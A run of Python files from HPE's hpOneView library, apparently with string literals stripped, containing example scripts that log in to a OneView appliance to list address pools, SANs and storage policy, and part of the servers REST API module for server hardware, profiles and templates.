help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
choices = [ , , , \n 
, ] , \n 
default = , \n 
help = ) \n 
\n 
args = parser . parse_args ( ) \n 
credential = { : args . user , : args . passwd } \n 
\n 
con = hpov . connection ( args . host ) \n 
srv = hpov . servers ( con ) \n 
sts = hpov . settings ( con ) \n 
\n 
if args . proxy : \n 
~~~ con . set_proxy ( args . proxy . split ( ) [ 0 ] , args . proxy . split ( ) [ 1 ] ) \n 
~~ if args . cert : \n 
~~~ con . set_trusted_ssl_bundle ( args . cert ) \n 
\n 
~~ login ( con , credential ) \n 
acceptEULA ( con ) \n 
\n 
eg_uri = get_eg_uri_from_arg ( srv , args . enc_group ) \n 
\n 
sht = get_sht_from_arg ( srv , args . server_hwt ) \n 
\n 
fw_settings = profile . make_firmware_dict ( sts , args . baseline ) \n 
\n 
boot , bootmode = profile . make_boot_settings_dict ( srv , sht , args . disable_manage_boot , \n 
args . boot_order , args . boot_mode , args . pxe ) \n 
\n 
define_profile_template ( srv , \n 
args . name , \n 
args . desc , \n 
args . sp_desc , \n 
sht [ ] , \n 
eg_uri , \n 
args . affinity , \n 
args . hide_flexnics , \n 
args . conn_list , \n 
fw_settings , \n 
boot , \n 
bootmode ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ import argparse \n 
sys . exit ( main ( ) ) \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
#!/usr/bin/env python \n 
### \n 
# (C) Copyright (2012-2015) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
~~ from __future__ import print_function \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from builtins import range \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
import sys \n 
\n 
PYTHON_VERSION = sys . version_info [ : 3 ] \n 
PY2 = ( PYTHON_VERSION [ 0 ] == 2 ) \n 
if PY2 : \n 
~~~ if PYTHON_VERSION < ( 2 , 7 , 9 ) : \n 
~~~ raise Exception ( ) \n 
~~ ~~ elif PYTHON_VERSION < ( 3 , 4 ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ import hpOneView as hpov \n 
from pprint import pprint \n 
\n 
\n 
def acceptEULA ( con ) : \n 
# See if we need to accept the EULA before we try to log in \n 
~~~ con . get_eula_status ( ) \n 
try : \n 
~~~ if con . get_eula_status ( ) is True : \n 
~~~ print ( "EULA display needed" ) \n 
con . set_eula ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print ( ) \n 
print ( e ) \n 
\n 
\n 
~~ ~~ def login ( con , credential ) : \n 
# Login with givin credentials \n 
~~~ try : \n 
~~~ con . login ( credential ) \n 
~~ except : \n 
~~~ print ( ) \n 
\n 
\n 
~~ ~~ def get_address_pools ( con , srv , types ) : \n 
~~~ if types == or types == : \n 
~~~ vmac = srv . get_vmac_pool ( ) \n 
print ( ) \n 
for key in sorted ( vmac ) : \n 
~~~ print ( . format ( key , vmac [ key ] ) ) \n 
~~ if in vmac : \n 
~~~ for uri in vmac [ ] : \n 
~~~ ranges = con . get ( uri ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
~~ ~~ ~~ if types == or types == : \n 
~~~ vwwn = srv . get_vwwn_pool ( ) \n 
print ( ) \n 
for key in sorted ( vwwn ) : \n 
~~~ print ( . format ( key , vwwn [ key ] ) ) \n 
~~ if in vwwn : \n 
~~~ for uri in vwwn [ ] : \n 
~~~ ranges = con . get ( uri ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
~~ ~~ ~~ if types == or types == : \n 
~~~ vsn = srv . get_vsn_pool ( ) \n 
print ( ) \n 
for key in sorted ( vsn ) : \n 
~~~ print ( . format ( key , vsn [ key ] ) ) \n 
~~ if in vsn : \n 
~~~ for uri in vsn [ ] : \n 
~~~ ranges = con . get ( uri ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
\n 
\n 
~~ ~~ ~~ ~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( add_help = True , \n 
formatter_class = argparse . RawTextHelpFormatter , \n 
description = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
choices = [ , , , ] , default = , \n 
help = ) \n 
\n 
args = parser . parse_args ( ) \n 
credential = { : args . domain . upper ( ) , : args . user , : args . passwd } \n 
\n 
con = hpov . connection ( args . host ) \n 
srv = hpov . servers ( con ) \n 
\n 
if args . proxy : \n 
~~~ con . set_proxy ( args . proxy . split ( ) [ 0 ] , args . proxy . split ( ) [ 1 ] ) \n 
~~ if args . cert : \n 
~~~ con . set_trusted_ssl_bundle ( args . cert ) \n 
\n 
~~ login ( con , credential ) \n 
acceptEULA ( con ) \n 
\n 
get_address_pools ( con , srv , args . types ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ import sys \n 
import argparse \n 
sys . exit ( main ( ) ) \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
#!/usr/bin/env python \n 
### \n 
# (C) Copyright (2012-2015) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
~~ from __future__ import print_function \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from builtins import range \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
import sys \n 
import re \n 
\n 
PYTHON_VERSION = sys . version_info [ : 3 ] \n 
PY2 = ( PYTHON_VERSION [ 0 ] == 2 ) \n 
if PY2 : \n 
~~~ if PYTHON_VERSION < ( 2 , 7 , 9 ) : \n 
~~~ raise Exception ( ) \n 
~~ ~~ elif PYTHON_VERSION < ( 3 , 4 ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ import hpOneView as hpov \n 
from pprint import pprint \n 
\n 
\n 
def acceptEULA ( con ) : \n 
# See if we need to accept the EULA before we try to log in \n 
~~~ con . get_eula_status ( ) \n 
try : \n 
~~~ if con . get_eula_status ( ) is True : \n 
~~~ print ( ) \n 
con . set_eula ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print ( ) \n 
print ( e ) \n 
\n 
\n 
~~ ~~ def login ( con , credential ) : \n 
# Login with givin credentials \n 
~~~ try : \n 
~~~ con . login ( credential ) \n 
~~ except : \n 
~~~ print ( ) \n 
\n 
\n 
~~ ~~ def get_managed_sans ( fcs ) : \n 
~~~ sans = fcs . get_managed_sans ( ) \n 
pprint ( sans ) \n 
\n 
\n 
~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( add_help = True , \n 
formatter_class = argparse . RawTextHelpFormatter , \n 
description = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
\n 
args = parser . parse_args ( ) \n 
credential = { : args . domain . upper ( ) , : args . user , : args . passwd } \n 
\n 
con = hpov . connection ( args . host ) \n 
fcs = hpov . fcsans ( con ) \n 
\n 
if args . proxy : \n 
~~~ con . set_proxy ( args . proxy . split ( ) [ 0 ] , args . proxy . split ( ) [ 1 ] ) \n 
~~ if args . cert : \n 
~~~ con . set_trusted_ssl_bundle ( args . cert ) \n 
\n 
~~ login ( con , credential ) \n 
acceptEULA ( con ) \n 
\n 
get_managed_sans ( fcs ) \n 
\n 
~~ if __name__ == : \n 
~~~ import sys \n 
import argparse \n 
sys . exit ( main ( ) ) \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
#!/usr/bin/env python \n 
### \n 
# (C) Copyright (2012-2015) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
~~ from __future__ import print_function \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from builtins import range \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
import sys \n 
\n 
PYTHON_VERSION = sys . version_info [ : 3 ] \n 
PY2 = ( PYTHON_VERSION [ 0 ] == 2 ) \n 
if PY2 : \n 
~~~ if PYTHON_VERSION < ( 2 , 7 , 9 ) : \n 
~~~ raise Exception ( ) \n 
~~ ~~ elif PYTHON_VERSION < ( 3 , 4 ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ import hpOneView as hpov \n 
from pprint import pprint \n 
\n 
\n 
def acceptEULA ( con ) : \n 
# See if we need to accept the EULA before we try to log in \n 
~~~ con . get_eula_status ( ) \n 
try : \n 
~~~ if con . get_eula_status ( ) is True : \n 
~~~ print ( ) \n 
con . set_eula ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print ( ) \n 
print ( e ) \n 
\n 
\n 
~~ ~~ def login ( con , credential ) : \n 
# Login with givin credentials \n 
~~~ try : \n 
~~~ con . login ( credential ) \n 
~~ except : \n 
~~~ print ( ) \n 
\n 
\n 
~~ ~~ def getpolicy ( sts ) : \n 
~~~ policy = sts . get_storage_vol_template_policy ( ) \n 
print ( policy [ ] ) \n 
\n 
\n 
~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( add_help = True , \n 
formatter_class = argparse . RawTextHelpFormatter , \n 
description = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
\n 
args = parser . parse_args ( ) \n 
credential = { : args . domain . upper ( ) , : args . user , : args . passwd } \n 
\n 
con = hpov . connection ( args . host ) \n 
sts = hpov . settings ( con ) \n 
\n 
if args . proxy : \n 
~~~ con . set_proxy ( args . proxy . split ( ) [ 0 ] , args . proxy . split ( ) [ 1 ] ) \n 
~~ if args . cert : \n 
~~~ con . set_trusted_ssl_bundle ( args . cert ) \n 
\n 
~~ login ( con , credential ) \n 
acceptEULA ( con ) \n 
\n 
getpolicy ( sts ) \n 
\n 
~~ if __name__ == : \n 
~~~ import sys \n 
import argparse \n 
sys . exit ( main ( ) ) \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ """\nservers.py\n~~~~~~~~~~~~\n\nThis module implements servers HP OneView REST API\n""" \n 
from __future__ import unicode_literals \n 
from __future__ import print_function \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
from pprint import pprint \n 
\n 
__title__ = \n 
__version__ = \n 
__copyright__ = \n 
__license__ = \n 
__status__ = \n 
\n 
### \n 
# (C) Copyright (2012-2015) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
\n 
from hpOneView . common import * \n 
from hpOneView . connection import * \n 
from hpOneView . activity import * \n 
from hpOneView . exceptions import * \n 
\n 
class servers ( object ) : \n 
\n 
~~~ def __init__ ( self , con ) : \n 
~~~ self . _con = con \n 
self . _activity = activity ( con ) \n 
\n 
########################################################################### \n 
# Connections \n 
########################################################################### \n 
\n 
~~ def get_connections ( self , filter = ) : \n 
~~~ """ List all the active connections\n\n            Args:\n                filter:\n                    A general filter/query string that narrows the list of\n                    resources returned by a multi-resource GET (read) request and\n                    DELETE (delete) request. The default is no filter\n                    (all resources are returned). The filter parameter specifies\n                    a general filter/query string. This query string narrows the\n                    selection of resources returned from a GET request that\n                    returns a list of resources. The following example shows how to\n                    retrieve only the first 10 connections:\n\n            Returns: all the connections, filtered or not.\n            """ \n 
return get_members ( self . _con . get ( uri [ ] + filter ) ) \n 
\n 
~~ def get_connection ( self , server ) : \n 
~~~ """ List a specific connection\n\n            Args:\n                server:\n                    Connection id\n\n            Returns: all the connections, filtered or not.\n        """ \n 
body = self . _con . get ( server [ ] ) \n 
return body \n 
\n 
########################################################################### \n 
# Server Hardware \n 
########################################################################### \n 
~~ def get_server_by_bay ( self , baynum ) : \n 
~~~ servers = get_members ( self . _con . get ( uri [ ] ) ) \n 
for server in servers : \n 
~~~ if server [ ] == baynum : \n 
~~~ return server \n 
\n 
~~ ~~ ~~ def get_server_by_name ( self , name ) : \n 
~~~ servers = get_members ( self . _con . get ( uri [ ] ) ) \n 
for server in servers : \n 
~~~ if server [ ] == name : \n 
~~~ return server \n 
\n 
~~ ~~ ~~ def get_available_servers ( self , server_hardware_type = None , \n 
enclosure_group = None , server_profile = None ) : \n 
~~~ filters = [ ] \n 
if server_hardware_type : \n 
~~~ filters . append ( + server_hardware_type [ ] ) \n 
~~ if enclosure_group : \n 
~~~ filters . append ( + enclosure_group [ ] ) \n 
~~ if server_profile : \n 
~~~ filters . append ( + server_profile [ ] ) \n 
\n 
~~ query_string = \n 
if filters : \n 
~~~ query_string = + . join ( filters ) \n 
\n 
~~ return self . _con . get ( uri [ ] + query_string ) \n 
\n 
~~ def get_servers ( self ) : \n 
~~~ return get_members ( self . _con . get ( uri [ ] ) ) \n 
\n 
~~ def get_utilization ( self , server ) : \n 
~~~ """Retrieves historical utilization data for the specified resource, metrics, and time span. """ \n 
body = self . _con . get ( server [ ] + ) \n 
return body \n 
\n 
~~ def get_env_conf ( self , server ) : \n 
~~~ """Gets the settings that describe the environmental configuration of the server hardware resource. """ \n 
body = self . _con . get ( server [ ] + ) \n 
return body \n 
\n 
~~ def set_server_powerstate ( self , server , state , force = False , blocking = True , \n 
verbose = False ) : \n 
~~~ if state == and force is True : \n 
~~~ powerRequest = make_powerstate_dict ( , ) \n 
~~ elif state == and force is False : \n 
~~~ powerRequest = make_powerstate_dict ( , ) \n 
~~ elif state == : \n 
~~~ powerRequest = make_powerstate_dict ( , ) \n 
~~ elif state == : \n 
~~~ powerRequest = make_powerstate_dict ( , ) \n 
~~ task , body = self . _con . put ( server [ ] + , powerRequest ) \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 60 , verbose = verbose ) \n 
~~ return task \n 
\n 
~~ def delete_server ( self , server , force = False , blocking = True , verbose = False ) : \n 
~~~ if force : \n 
~~~ task , body = self . _con . delete ( server [ ] + ) \n 
~~ else : \n 
~~~ task , body = self . _con . delete ( server [ ] ) \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
~~ return task \n 
\n 
~~ def update_server ( self , server ) : \n 
~~~ task , body = self . _con . put ( server [ ] , server ) \n 
return body \n 
\n 
~~ def add_server ( self , server , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . post ( uri [ ] , server ) \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
server = self . _con . get ( entity [ ] ) \n 
return server \n 
~~ ~~ return task \n 
\n 
~~ def get_server_schema ( self ) : \n 
~~~ """ Gets the JSON schema of the server hardware resource.""" \n 
return self . _con . get ( uri [ ] + ) \n 
\n 
~~ def get_bios ( self , server ) : \n 
~~~ """ Gets the list of BIOS/UEFI values currently set on the physical server.""" \n 
return self . _con . get ( server [ ] + ) \n 
\n 
~~ def get_ilo_sso_url ( self , server ) : \n 
~~~ """ Retrieves the URL to launch a Single Sign-On (SSO) session for the iLO web interface.""" \n 
return self . _con . get ( server [ ] + ) \n 
\n 
~~ def get_java_remote_console_url ( self , server ) : \n 
~~~ """ Generates a Single Sign-On (SSO) session for the iLO Java Applet console and returns\n        the URL to launch it. """ \n 
return self . _con . get ( server [ ] + ) \n 
\n 
~~ def get_remote_console_url ( self , server ) : \n 
~~~ """ Generates a Single Sign-On (SSO) session for the iLO Integrated Remote Console Application\n        (IRC) and returns the URL to launch it.""" \n 
return self . _con . get ( server [ ] + ) \n 
\n 
########################################################################### \n 
# Server Hardware Types \n 
########################################################################### \n 
~~ def get_server_hardware_types ( self ) : \n 
~~~ """ Get the list of server hardware type resources defined on the appliance.""" \n 
body = self . _con . get ( uri [ ] ) \n 
return get_members ( body ) \n 
\n 
~~ def remove_server_hardware_type ( self , server_hardware_type , force = False , blocking = True , verbose = False ) : \n 
~~~ """ Remove the server hardware type with the specified URI. A server hardware type cannot be deleted\n         if it is associated with a server hardware or server profile resource. """ \n 
if force : \n 
~~~ task , body = self . _con . delete ( server_hardware_type [ ] + ) \n 
~~ else : \n 
~~~ task , body = self . _con . delete ( server_hardware_type [ ] ) \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
~~ return task \n 
\n 
~~ def get_server_type_schema ( self ) : \n 
~~~ """ Get the JSON schema of the server hardware types resource.""" \n 
return self . _con . get ( uri [ ] + ) \n 
\n 
~~ def get_server_hardware_type ( self , server_type ) : \n 
~~~ """ Get the server hardware type resource with the specified ID.""" \n 
return self . _con . get ( server_type [ ] ) \n 
\n 
~~ def set_server_hardware_type ( self , server_hardware_type , name , description ) : \n 
~~~ """ Updates one or more attributes for a server hardware type resource.\n\n        Args:\n            name:\n                 The localized name that describes a BIOS/UEFI setting.\n            description:\n                 Brief description of the server hardware type.\n                    Maximum Length: 255\n                    Minimum Length: 0\n        """ \n 
request = make_server_type_dict ( name , description ) \n 
task , body = self . _con . put ( server_hardware_type [ ] , request ) \n 
return task \n 
\n 
########################################################################### \n 
# Server Profiles \n 
########################################################################### \n 
~~ def create_server_profile ( self , \n 
affinity = , \n 
biosSettings = None , \n 
bootSettings = None , \n 
bootModeSetting = None , \n 
profileConnectionV4 = None , \n 
description = None , \n 
firmwareSettingsV3 = None , \n 
hideUnusedFlexNics = True , \n 
localStorageSettingsV3 = None , \n 
macType = , \n 
name = None , \n 
sanStorageV3 = None , \n 
serialNumber = None , \n 
serialNumberType = , \n 
serverHardwareTypeUri = None , \n 
serverHardwareUri = None , \n 
serverProfileTemplateUri = None , \n 
uuid = None , \n 
wwnType = , \n 
blocking = True , verbose = False ) : \n 
~~~ """ Create a ServerProfileV5 profile for use with the V200 API\n\n        Args:\n            affinity:\n                This identifies the behavior of the server profile when the server\n                hardware is removed or replaced. This can be set to \'Bay\' or\n                \'BayAndServer\'.\n            biosSettings:\n                Dictionary that describes Server BIOS settings\n            bootSettings:\n                Dictionary that indicates that the server will attempt to boot from\n                this connection. This object can only be specified if\n                "boot.manageBoot" is set to \'true\'\n            bootModeSetting:\n                Dictionary that describes the boot mode settings to be configured on\n                Gen9 and newer servers.\n            profileConnectionV4:\n                Array of ProfileConnectionV3\n            description:\n                Description of the Server Profile\n            firmwareSettingsV3:\n                FirmwareSettingsV3 dictionary that defines the firmware baseline\n                and management\n            hideUnusedFlexNics:\n                This setting controls the enumeration of physical functions that do\n                not correspond to connections in a profile.\n            localStorageSettingsV3:\n                Dictionary that describes the local storage settings.\n            macType:\n                Specifies the type of MAC address to be programmed into the IO\n                devices. The value can be \'Virtual\', \'Physical\' or \'UserDefined\'.\n            name:\n                Unique name of the Server Profile\n            sanStorageV3:\n                Dictionary that describes the SAN storage settings.\n            serialNumber:\n                A 10-byte value that is exposed to the Operating System as the\n                server hardware\'s Serial Number. The value can be a virtual serial\n                number, user defined serial number or physical serial number read\n                from the server\'s ROM. It cannot be modified after the profile is\n                created.\n            serialNumberType:\n                 Specifies the type of Serial Number and UUID to be programmed into\n                 the server ROM. The value can be \'Virtual\', \'UserDefined\', or\n                 \'Physical\'. The serialNumberType defaults to \'Virtual\' when\n                 serialNumber or uuid are not specified. It cannot be modified\n                 after the profile is created.\n            serverHardwareTypeUri:\n                Identifies the server hardware type for which the Server Profile\n                was designed. The serverHardwareTypeUri is determined when the\n                profile is created.\n            serverHardwareUri:\n                 Identifies the server hardware to which the server profile is\n                 currently assigned, if applicable\n            serverProfileTemplateUri:\n                Identifies the Server profile template the Server Profile is based\n                on.\n            uuid:\n                A 36-byte value that is exposed to the Operating System as the\n                server hardware\'s UUID. The value can be a virtual uuid, user\n                defined uuid or physical uuid read from the server\'s ROM. It\n                cannot be modified after the profile is created.\n            wwnType:\n                 Specifies the type of WWN address to be programmed into the IO\n                 devices. The value can be \'Virtual\', \'Physical\' or \'UserDefined\'.\n                 It cannot be modified after the profile is created.\n\n        Returns: server profile or task\n        """ \n 
\n 
# Creating a profile returns a task with no resource uri \n 
profile = make_ServerProfileV5 ( affinity , biosSettings , bootSettings , \n 
bootModeSetting , profileConnectionV4 , \n 
description , firmwareSettingsV3 , \n 
hideUnusedFlexNics , \n 
localStorageSettingsV3 , macType , name , \n 
sanStorageV3 , serialNumber , \n 
serialNumberType , serverHardwareTypeUri , \n 
serverHardwareUri , \n 
serverProfileTemplateUri , uuid , wwnType ) \n 
task , body = self . _con . post ( uri [ ] , profile ) \n 
if profile [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( entity [ ] ) \n 
return profile \n 
~~ ~~ return task \n 
\n 
\n 
~~ def post_server_profile ( self , profile , blocking = True , verbose = False ) : \n 
~~~ """ POST a ServerProfileV5 profile for use with the V200 API\n\n        Args:\n            profile:\n                ServerProfileV5\n\n        Returns: server profile or task\n        """ \n 
\n 
task , body = self . _con . post ( uri [ ] , profile ) \n 
if profile [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( entity [ ] ) \n 
return profile \n 
~~ ~~ return task \n 
\n 
\n 
~~ def remove_server_profile ( self , profile , force = False , blocking = True , verbose = False ) : \n 
~~~ if force : \n 
~~~ task , body = self . _con . delete ( profile [ ] + ) \n 
~~ else : \n 
~~~ task , body = self . _con . delete ( profile [ ] ) \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
~~ return task \n 
\n 
~~ def get_server_profiles ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return get_members ( body ) \n 
\n 
~~ def update_server_profile ( self , profile , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . put ( profile [ ] , profile ) \n 
try : \n 
~~~ if profile [ ] [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
~~ ~~ except Exception : \n 
~~~ tout = 600 \n 
# Update the task to get the associated resource uri \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = tout , verbose = verbose ) \n 
~~ profileResource = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( profileResource [ ] ) \n 
return profile \n 
\n 
~~ def update_server_profile_from_template ( self , profile , blocking = True , verbose = False ) : \n 
~~~ patch_request = [ { : , : , : } ] \n 
task , body = self . _con . patch ( profile [ ] , patch_request ) \n 
try : \n 
~~~ if profile [ ] [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
~~ ~~ except Exception : \n 
~~~ tout = 600 \n 
# Update the task to get the associated resource uri \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = tout , verbose = verbose ) \n 
~~ profileResource = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( profileResource [ ] ) \n 
return profile \n 
\n 
~~ ~~ def get_server_profile_by_name ( self , name ) : \n 
~~~ body = self . _con . get_entity_byfield ( uri [ ] , , name ) \n 
return body \n 
\n 
~~ def get_profile_message ( self , profile ) : \n 
~~~ """ Retrieve the error or status messages associated with the specified profile. """ \n 
message = self . _con . get ( profile [ ] + ) \n 
return message \n 
\n 
~~ def get_profile_compliance_preview ( self , profile ) : \n 
~~~ """ Gets the preview of manual and automatic updates required to make the\n        server profile consistent with its template. """ \n 
return self . _con . get ( profile [ ] + ) \n 
\n 
########################################################################### \n 
# Server Profile Templates \n 
########################################################################### \n 
~~ def create_server_profile_template ( \n 
self , \n 
name = None , \n 
description = None , \n 
serverProfileDescription = None , \n 
serverHardwareTypeUri = None , \n 
enclosureGroupUri = None , \n 
affinity = None , \n 
hideUnusedFlexNics = None , \n 
profileConnectionV4 = None , \n 
firmwareSettingsV3 = None , \n 
bootSettings = None , \n 
bootModeSetting = None , \n 
blocking = True , \n 
verbose = False ) : \n 
